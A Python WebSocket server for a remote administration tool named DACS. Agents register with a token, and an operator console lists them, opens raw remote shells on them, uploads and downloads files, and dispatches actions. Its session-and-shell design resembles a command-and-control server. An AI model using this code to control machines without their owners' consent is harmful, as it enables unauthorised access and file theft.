import asyncio
import json
import logging
import os
import base64
import shlex
import subprocess
import sys
import threading
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, Optional, Tuple
from urllib.parse import urlparse

from websockets.asyncio.server import ServerConnection, serve
from websockets.exceptions import ConnectionClosed

from .config import load_settings
from .models import ALLOWED_ACTIONS, ClientSession, TaskResult, command_message
from .registry import Registry


logging.basicConfig(level=logging.WARNING, format="%(asctime)s %(levelname)s %(name)s %(message)s")
log = logging.getLogger("dacs.server")
settings = load_settings()
registry = Registry()
LOCAL_HOST_ALIASES = {"localhost", "127.0.0.1", "::1"}
active_tty_sessions = set()
active_downloads = {}
logging.getLogger("websockets.server").setLevel(logging.WARNING)
logging.getLogger("websockets").setLevel(logging.WARNING)

_console_lock = threading.Lock()
_prompt_visible = False
_active_prompt = "dacs> "
_COLOR = sys.stdout.isatty()

_RESET = "\033[0m" if _COLOR else ""
_DIM = "\033[2m" if _COLOR else ""
_BOLD = "\033[1m" if _COLOR else ""
_GREEN = "\033[32m" if _COLOR else ""
_YELLOW = "\033[33m" if _COLOR else ""
_RED = "\033[31m" if _COLOR else ""
_CYAN = "\033[36m" if _COLOR else ""

ACTION_SCHEMAS: Dict[str, Dict[str, Any]] = {
    "restart_agent": {
        "description": "Restart the remote agent",
        "fields": [],
    },
}


def setup_readline() -> None:
    """Enable arrow-key history navigation when readline is available."""
    try:
        import atexit
        import readline

        history_path = os.path.expanduser("~/.dacs_history")
        try:
            readline.read_history_file(history_path)
        except FileNotFoundError:
            pass

        readline.parse_and_bind("tab: complete")
        readline.parse_and_bind("set editing-mode emacs")
        readline.set_history_length(500)
        atexit.register(readline.write_history_file, history_path)
    except Exception:
        # Non-fatal: console still works without readline.
        pass


def _now_str() -> str:
    return datetime.now(timezone.utc).astimezone().strftime("%H:%M:%S")


def _level_style(level: str) -> str:
    normalized = level.upper()
    if normalized == "INFO":
        return f"{_GREEN}[+]{_RESET}"
    if normalized in ("WARN", "WARNING"):
        return f"{_YELLOW}[!]{_RESET}"
    if normalized in ("ERR", "ERROR"):
        return f"{_RED}[-]{_RESET}"
    return f"{_CYAN}[*]{_RESET}"


def console_print(message: str, level: str = "INFO") -> None:
    global _prompt_visible
    with _console_lock:
        if _prompt_visible:
            # Move to start of current line and clear it before printing async event.
            if _COLOR:
                sys.stdout.write("\r\033[2K")
            else:
                sys.stdout.write("\r")
        ts = f"{_DIM}{_now_str()}{_RESET}"
        sev = _level_style(level)
        sys.stdout.write(f"{ts} {sev} {message}\n")
        if _prompt_visible:
            sys.stdout.write(_active_prompt)
        sys.stdout.flush()


def render_help(in_session: bool = False) -> str:
    available_actions = ", ".join(sorted(ALLOWED_ACTIONS))
    if in_session:
        return "\n".join([
            f"{_BOLD}DACS Interactive Session{_RESET}",
            "----------------------------------------",
            "Commands:",
            "  help              - Show this help menu",
            "  run               - Execute action (usage: run <action_name> [json])",
            "  upload            - Send file to client (usage: upload <server_path> <client_path>)",
            "  download          - Get file from client (usage: download <client_path> [server_path])",
            "  tty               - Enter raw interactive shell",
            "  back              - Exit active session",
            "  clear | cls       - Clear the console screen",
            "",
            "Available actions:",
            f"  {available_actions}",
            "----------------------------------------",
        ])
    return "\n".join([
        f"{_BOLD}DACS Global Console{_RESET}",
        "----------------------------------------",
        "Commands:",
        "  help              - Show this help menu",
        "  sessions|clients  - List all connected clients",
        "  use               - Enter interactive session (usage: use <client_id>)",
        "  tty               - Enter raw interactive shell (usage: tty <client_id>)",
        "  task              - View task result details (usage: task <task_id>)",
        "  clear | cls       - Clear the console screen",
        "  quit              - Stop the server",
        "----------------------------------------",
    ])


def clear_screen() -> None:
    """Clear terminal screen across common shells/OSes."""
    cmd = ["cls"] if os.name == "nt" else ["clear"]
    try:
        subprocess.run(cmd, check=False)
        return
    except Exception:
        pass

    # Fallback for minimal terminals
    if _COLOR:
        print("\033[2J\033[H", end="", flush=True)
    else:
        print("\n" * 60)


def _pretty_last_seen(iso_timestamp: str) -> str:
    try:
        dt = datetime.fromisoformat(iso_timestamp)
        local_dt = dt.astimezone()
        return local_dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return iso_timestamp


def format_clients_for_json(clients: Any) -> Any:
    out = []
    for client in clients:
        item = dict(client)
        item["last_seen"] = _pretty_last_seen(str(item.get("last_seen", "")))
        out.append(item)
    return out


def _origin_allowed(origin: Optional[str]) -> bool:
    if not settings.allowed_origins:
        return True
    if not origin:
        return True
    if "*" in settings.allowed_origins:
        return True

    normalized_origin = origin.rstrip("/")
    normalized_allowed = [item.rstrip("/") for item in settings.allowed_origins]
    if normalized_origin in normalized_allowed:
        return True

    origin_host = urlparse(normalized_origin).hostname
    if not origin_host:
        return False

    for allowed in normalized_allowed:
        parsed = urlparse(allowed if "://" in allowed else f"http://{allowed}")
        allowed_host = parsed.hostname
        if not allowed_host:
            continue
        if allowed_host == origin_host:
            return True
        if allowed_host in LOCAL_HOST_ALIASES and origin_host in LOCAL_HOST_ALIASES:
            return True

    return False


async def send_command(client_id: str, action: str, payload: Optional[Dict[str, Any]]) -> Tuple[bool, str]:
    if action not in ALLOWED_ACTIONS:
        return False, "action_not_allowed"

    client = await registry.get_client(client_id)
    if not client:
        return False, "client_not_connected"

    task_id = str(uuid.uuid4())
    await registry.create_task(TaskResult(task_id, client_id, action, "dispatched", ""))

    try:
        await client.websocket.send(json.dumps(command_message(task_id, action, payload or {})))
        console_print(
            "Dispatched action='%s' task_id=%s target=%s"
            % (action, task_id, client_id),
            "INFO",
        )
        return True, task_id
    except Exception as exc:
        await registry.update_task(task_id, client_id, "error", f"dispatch_failed: {exc}")
        return False, "dispatch_failed"


async def handle_client_messages(client_id: str, websocket: ServerConnection) -> None:
    while True:
        raw = await websocket.recv()
        if isinstance(raw, bytes):
            continue
        try:
            message = json.loads(raw)
        except json.JSONDecodeError:
            continue

        mtype = message.get("type")
        if mtype in ("ping", "pong"):
            await registry.touch(client_id)
            continue

        if mtype == "tty_output":
            data = message.get("data", "")
            sys.stdout.write(data)
            sys.stdout.flush()
            continue

        if mtype == "download_chunk":
            transfer_id = message.get("transfer_id")
            b64_data = message.get("data")
            if transfer_id in active_downloads:
                try:
                    data = base64.b64decode(b64_data)
                    active_downloads[transfer_id].write(data)
                except Exception as e:
                    console_print(f"Error decoding chunk: {e}", "ERROR")
            continue

        if mtype == "download_end":
            transfer_id = message.get("transfer_id")
            f = active_downloads.pop(transfer_id, None)
            if f:
                f.close()
                console_print(f"Download {transfer_id} finished", "INFO")
            continue
            
        if mtype == "download_error":
            transfer_id = message.get("transfer_id")
            err = message.get("error", "Unknown")
            f = active_downloads.pop(transfer_id, None)
            if f:
                f.close()
            console_print(f"Download {transfer_id} failed: {err}", "ERROR")
            continue
            
        if mtype == "upload_ready":
            continue
        if mtype == "upload_error":
            console_print(f"Upload failed: {message.get('error')}", "ERROR")
            continue

        if mtype == "result":
            task_id = message.get("task_id", "")
            status = message.get("status", "unknown")
            output = message.get("output", "")
            await registry.update_task(
                task_id=task_id,
                client_id=client_id,
                status=status,
                output=output,
            )
            await registry.touch(client_id)

            task_info = await registry.get_task(task_id)
            action = task_info.get("action", "unknown") if task_info else "unknown"
            preview = str(output).replace("\n", " ")
            if len(preview) > 120:
                preview = preview[:117] + "..."
            console_print(
                "Result action='%s' task_id=%s client=%s status=%s output=%s"
                % (action, task_id, client_id, status, preview),
                "INFO",
            )
            continue


async def ws_handler(websocket: ServerConnection) -> None:
    if websocket.request.path != "/ws":
        await websocket.close(code=1008, reason="invalid_path")
        return

    origin = websocket.request.headers.get("Origin")
    if not _origin_allowed(origin):
        console_print(
            "Rejected origin '%s' (allowed=%s)"
            % (origin, settings.allowed_origins),
            "WARN",
        )
        await websocket.close(code=1008, reason="origin_not_allowed")
        return

    client_id = None

    try:
        register_raw = await asyncio.wait_for(websocket.recv(), timeout=10)
        if isinstance(register_raw, bytes):
            await websocket.close(code=1008, reason="invalid_register")
            return

        register = json.loads(register_raw)
        if register.get("type") != "register":
            await websocket.close(code=1008, reason="missing_register")
            return

        if register.get("token") != settings.agent_token:
            await websocket.close(code=1008, reason="auth_failed")
            return

        requested_client_id = register.get("client_id")
        if not requested_client_id:
            await websocket.close(code=1008, reason="missing_client_id")
            return

        existing_ids = set(await registry.client_ids())
        client_id = requested_client_id
        if client_id in existing_ids:
            counter = 2
            while f"{requested_client_id}#{counter}" in existing_ids:
                counter += 1
            client_id = f"{requested_client_id}#{counter}"
            console_print(
                "Duplicate client_id '%s' detected, assigned '%s'"
                % (requested_client_id, client_id),
                "WARN",
            )

        session = ClientSession(
            client_id=client_id,
            websocket=websocket,
            version=register.get("version", "unknown"),
            system=register.get("system", {}),
        )
        await registry.register(session)
        console_print("Client connected: %s" % client_id, "INFO")

        await handle_client_messages(client_id, websocket)

    except ConnectionClosed:
        pass
    except Exception as exc:
        log.exception("Connection error (%s): %s", client_id, exc)
    finally:
        await registry.remove_client(client_id)
        if client_id in active_tty_sessions:
            active_tty_sessions.remove(client_id)
        if client_id:
            console_print("Client disconnected: %s" % client_id, "INFO")


async def cleanup_loop() -> None:
    while True:
        await asyncio.sleep(settings.cleanup_interval_seconds)
        stale = await registry.inactive_clients(settings.inactive_timeout_seconds)
        for c in stale:
            console_print("Removing inactive client %s" % c.client_id, "WARN")
            try:
                await c.websocket.close(code=1001, reason="inactive")
            except Exception:
                pass


def _parse_json_payload(raw: str) -> Dict[str, Any]:
    if not raw:
        return {}
    parsed = json.loads(raw)
    if not isinstance(parsed, dict):
        raise ValueError("payload must be a JSON object")
    return parsed


def _build_payload_interactive(action: str) -> Optional[Dict[str, Any]]:
    schema = ACTION_SCHEMAS.get(action)
    if not schema:
        console_print(f"Unknown action '{action}'. Type 'help' to see available actions.", "WARN")
        return None

    fields = schema.get("fields", [])
    if not fields:
        return {}

    payload: Dict[str, Any] = {}
    print(f"Action: {action}")
    for field in fields:
        name = field.get("name")
        prompt = field.get("prompt", name)
        required = bool(field.get("required", False))
        default = field.get("default")

        suffix = " (required)" if required else ""
        default_hint = f" [default: {default}]" if default is not None else ""
        value = input(f"  {prompt}{suffix}{default_hint}: ").strip()

        if not value:
            if default is not None:
                payload[name] = default
                continue
            if required:
                print(f"  Field '{name}' is required.")
                return None
            continue

        payload[name] = value

    return payload


async def console_loop() -> None:
    global _prompt_visible, _active_prompt
    setup_readline()
    
    dashboard_text = "\n".join([
        f"{_BOLD}DACS Session Console{_RESET}",
        "----------------------------------------",
        "Type 'help' to see available commands.",
        "----------------------------------------",
    ])
    print(dashboard_text)

    active_session: Optional[str] = None

    while True:
        prompt = f"dacs({active_session})> " if active_session else "dacs> "
        _active_prompt = prompt
        _prompt_visible = True
        line = await asyncio.to_thread(input, prompt)
        _prompt_visible = False
        line = line.strip()
        if not line:
            continue

        if line == "help":
            print(render_help(in_session=bool(active_session)))
            continue

        if line in ("clients", "sessions"):
            clients = await registry.list_clients()
            if not clients:
                print("No clients connected.")
                continue
            
            print(f"\n{_BOLD} {'#':<2} | {'CLIENT ID':<20} | {'IP ADDRESS':<15} | {'LAST SYNC':<19} | {'OS':<9} | {'VERSION'}{_RESET}")
            print("-" * 90)
            for i, c in enumerate(format_clients_for_json(clients), 1):
                cid = str(c.get("client_id", "unknown"))[:24]
                sys_data = c.get("system", {})
                ip = str(sys_data.get("ip", "unknown"))[:14]
                os_name = str(sys_data.get("os", "unknown"))[:8]
                ver = str(c.get("version", c.get("agent_version", "unknown")))[:7]
                seen = str(c.get("last_seen", ""))[:19]
                print(f" {i:<2} | {cid:<20} | {ip:<15} | {seen:<19} | {os_name:<9} | {ver}")
            print()
            continue

        if line in ("clear", "cls"):
            clear_screen()
            print(dashboard_text)
            continue

        if line == "back":
            active_session = None
            continue

        if line == "quit":
            raise KeyboardInterrupt

        if line.startswith("tty"):
            parts = line.split(" ", 1)
            target = parts[1].strip() if len(parts) > 1 and parts[1].strip() else active_session
            
            if not target:
                print("Usage: tty <client_id> or 'use <client_id>' first")
                continue
            client = await registry.get_client(target)
            if not client:
                print("Session not found")
                continue
            
            if target in active_tty_sessions:
                print("Session is currently busy with another admin")
                continue
                
            active_tty_sessions.add(target)
            
            try:
                await client.websocket.send(json.dumps({"type": "tty_start"}))
            except Exception as e:
                print(f"Failed to start tty: {e}")
                active_tty_sessions.remove(target)
                continue
                
            print(f"\r\n{_CYAN}[*] Initiating interactive TTY session...{_RESET}")
            print(f"{_DIM}[Tip] Press Ctrl+X to background and detach from the session.{_RESET}\r\n")
            
            async def read_input_loop(client_ws):
                class RawTerminal:
                    def __enter__(self):
                        try:
                            if os.name != 'nt' and sys.stdin.isatty():
                                import tty, termios
                                self.fd = sys.stdin.fileno()
                                self.old_settings = termios.tcgetattr(self.fd)
                                tty.setraw(self.fd)
                        except Exception:
                            self.old_settings = None
                        return self
                    def __exit__(self, *args):
                        try:
                            if hasattr(self, "old_settings") and self.old_settings:
                                import termios
                                termios.tcsetattr(self.fd, termios.TCSADRAIN, self.old_settings)
                        except Exception:
                            pass
                            
                with RawTerminal():
                    while True:
                        if os.name == 'nt':
                            import msvcrt
                            ch_bytes = await asyncio.to_thread(msvcrt.getch)
                            ch = ch_bytes.decode('utf-8', 'ignore') if isinstance(ch_bytes, bytes) else ch_bytes
                        else:
                            ch = await asyncio.to_thread(sys.stdin.read, 1)
                            
                        if not ch or ch == '\x18':
                            try:
                                await client_ws.send(json.dumps({"type": "tty_stop"}))
                            except Exception:
                                pass
                            break
                            
                        try:
                            await client_ws.send(json.dumps({"type": "tty_input", "data": ch}))
                        except Exception:
                            break

            await read_input_loop(client.websocket)
            if target in active_tty_sessions:
                active_tty_sessions.remove(target)
            print(f"\r\n{_CYAN}[*] TTY session detached.{_RESET}\r\n")
            continue

        if line.startswith("upload "):
            if not active_session:
                print("No active session. Use: use <client_id>")
                continue
            try:
                parts = shlex.split(line)
            except Exception:
                parts = line.split(" ")
            if len(parts) < 3:
                print("Usage: upload <server_file_path> <client_file_path>")
                continue
                
            raw_local = parts[1]
            remote_path = parts[2]
            
            # Resolve server path
            expanded = os.path.expanduser(os.path.expandvars(raw_local))
            if os.path.isabs(expanded):
                local_path = expanded
            else:
                transfer_dir = os.path.join(os.getcwd(), 'transfers')
                os.makedirs(transfer_dir, exist_ok=True)
                cand1 = os.path.join(transfer_dir, expanded)
                cand2 = os.path.join(os.getcwd(), expanded)
                if os.path.exists(cand1):
                    local_path = cand1
                elif os.path.exists(cand2):
                    local_path = cand2
                else:
                    local_path = cand2
            
            client = await registry.get_client(active_session)
            if not client:
                print("Session not found")
                continue
                
            if not os.path.exists(local_path):
                print(f"Local file not found on server: {local_path}")
                continue
                
            transfer_id = str(uuid.uuid4())[:8]
            print(f"[*] Starting upload {transfer_id} of {local_path} to {remote_path}")
            
            async def _upload_task(client_ws, tid, lpath, rpath):
                try:
                    await client_ws.send(json.dumps({
                        "type": "upload_start",
                        "transfer_id": tid,
                        "remote_path": rpath
                    }))
                    with open(lpath, "rb") as f:
                        while True:
                            chunk = await asyncio.to_thread(f.read, 512 * 1024)
                            if not chunk:
                                break
                            b64_data = base64.b64encode(chunk).decode("utf-8")
                            await client_ws.send(json.dumps({
                                "type": "upload_chunk",
                                "transfer_id": tid,
                                "data": b64_data
                            }))
                    await client_ws.send(json.dumps({
                        "type": "upload_end",
                        "transfer_id": tid
                    }))
                    console_print(f"Upload {tid} finished", "INFO")
                except Exception as e:
                    console_print(f"Upload {tid} failed: {e}", "ERROR")
            
            asyncio.create_task(_upload_task(client.websocket, transfer_id, local_path, remote_path))
            continue

        if line.startswith("download "):
            if not active_session:
                print("No active session. Use: use <client_id>")
                continue
            try:
                parts = shlex.split(line)
            except Exception:
                parts = line.split(" ")
            if len(parts) < 2:
                print("Usage: download <client_file_path> [server_file_path]")
                continue
                
            remote_path = parts[1]
            if len(parts) >= 3:
                raw_local = parts[2]
            else:
                raw_local = os.path.join('transfers', os.path.basename(remote_path.replace("\\", "/")))
            
            # Resolve server path
            expanded = os.path.expanduser(os.path.expandvars(raw_local))
            if os.path.isabs(expanded):
                local_path = expanded
            else:
                transfer_dir = os.path.join(os.getcwd(), 'transfers')
                os.makedirs(transfer_dir, exist_ok=True)
                if raw_local.startswith("transfers"):
                    local_path = os.path.join(os.getcwd(), expanded)
                else:
                    local_path = os.path.join(transfer_dir, expanded)

            try:
                os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)
            except Exception:
                pass
            
            client = await registry.get_client(active_session)
            if not client:
                print("Session not found")
                continue
                
            transfer_id = str(uuid.uuid4())[:8]
            try:
                f = open(local_path, "wb")
                active_downloads[transfer_id] = f
            except Exception as e:
                print(f"Failed to open local file on server: {e}")
                continue
                
            print(f"[*] Starting download {transfer_id} from {remote_path} to {local_path}")
            try:
                await client.websocket.send(json.dumps({
                    "type": "download_start",
                    "transfer_id": transfer_id,
                    "remote_path": remote_path
                }))
            except Exception as e:
                print(f"Failed to send request: {e}")
                active_downloads.pop(transfer_id, None).close()
            continue

        if line.startswith("use "):
            target = line.split(" ", 1)[1].strip()
            if not target:
                print("Usage: use <client_id>")
                continue
                
            client_session = await registry.get_client(target)
            if not client_session:
                print("Session not found")
                continue
                
            active_session = target
            
            all_clients = await registry.list_clients()
            c_dict = next((c for c in format_clients_for_json(all_clients) if c["client_id"] == target), {})
            sys_data = c_dict.get("system", {})
            print(f"\n{_CYAN}[*] Attached to Session: {target}{_RESET}")
            print(f"    Version   : {c_dict.get('version', c_dict.get('agent_version', 'unknown'))}")
            print(f"    Last Sync : {c_dict.get('last_seen', 'unknown')}")
            print(f"    OS        : {sys_data.get('os', 'unknown')}")
            print(f"    Hostname  : {sys_data.get('hostname', 'unknown')}")
            print(f"    IP Address: {sys_data.get('ip', 'unknown')}")
            print(f"    User      : {sys_data.get('user', 'unknown')}\n")
            continue

        if line.startswith("run "):
            if not active_session:
                print("No active session. Use: use <client_id>")
                continue
            parts = line.split(" ", 2)
            if len(parts) < 2:
                print("Usage: run <action_name> [payload_json]")
                continue
            action = parts[1]
            payload: Optional[Dict[str, Any]] = None
            if len(parts) == 3:
                try:
                    payload = _parse_json_payload(parts[2])
                except Exception as exc:
                    print(f"Invalid payload: {exc}")
                    continue
            else:
                payload = await asyncio.to_thread(_build_payload_interactive, action)
                if payload is None:
                    continue
            ok, info = await send_command(active_session, action, payload)
            print(f"task_id={info}" if ok else f"error={info}")
            continue

        if line.startswith("task "):
            task_id = line.split(" ", 1)[1].strip()
            result = await registry.get_task(task_id)
            if not result:
                print("Task not found")
            else:
                print(json.dumps(result, indent=2))
            continue

        print("Unknown command. Type 'help'.")


async def main() -> None:
    console_print("Starting server on ws://%s:%s/ws" % (settings.host, settings.port), "INFO")
    async with serve(ws_handler, settings.host, settings.port, ping_interval=20, ping_timeout=20):
        await asyncio.gather(cleanup_loop(), console_loop())


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console_print("Server stopped", "INFO")
